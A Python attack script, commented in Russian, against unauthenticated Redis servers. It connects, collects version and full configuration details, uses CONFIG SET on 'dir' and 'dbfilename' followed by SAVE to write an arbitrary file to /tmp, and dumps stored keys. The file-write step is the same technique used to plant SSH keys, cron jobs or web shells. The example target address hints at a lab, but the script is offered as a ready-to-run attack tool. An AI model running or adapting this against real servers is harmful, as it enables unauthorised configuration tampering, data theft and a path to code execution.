#!/usr/bin/env python3
import redis
import sys

def attack_redis(host, port):
    """
    Комплексная атака на незащищенный Redis:
    - Проверка подключения
    - Сбор версии и конфигурации
    - Запись тестового файла в /tmp через RDB
    - Вывод найденных ключей
    """
    try:
        r = redis.Redis(host=host, port=port, decode_responses=True)
        
        # Проверка подключения
        print(f"[+] Подключение к Redis {host}:{port}")
        r.ping()
        print("[+] Подключение успешно!")
        
        # Информация о сервере
        info = r.info('server')
        print(f"[+] Redis версия: {info.get('redis_version', 'unknown')}")
        print(f"[+] ОС: {info.get('os', 'unknown')}")
        
        # Конфигурация
        cfg = r.config_get('*')
        print(f"[+] Текущая директория: {cfg.get('dir', 'N/A')}")
        print(f"[+] Имя файла БД: {cfg.get('dbfilename', 'N/A')}")
        print(f"[+] Пароль: {'НЕТ' if not cfg.get('requirepass', '') else 'УСТАНОВЛЕН'}")
        
        # Запись тестового файла в /tmp
        r.config_set('dir', '/tmp')
        r.config_set('dbfilename', 'redis_test.txt')
        r.set('payload', 'Redis compromised by attacker!')
        r.set('indicator', 'SYSTEM_COMPROMISED_BY_REDIS_ATTACK')
        r.save()
        print("[+] Тестовый файл записан в /tmp/redis_test.txt")
        
        # Вывод содержимого БД
        keys = r.keys('*')
        print(f"[+] Найдено ключей в БД: {len(keys)}")
        for key in keys[:10]:
            try:
                print(f" - {key}: {r.get(key)}")
            except Exception:
                print(f" - {key}: <non-string value>")
                
    except Exception as e:
        print(f"[-] Ошибка: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Использование: python3 redis_attack.py <host> <port>")
        print("Пример: python3 redis_attack.py 172.20.0.102 6379")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    attack_redis(host, port)
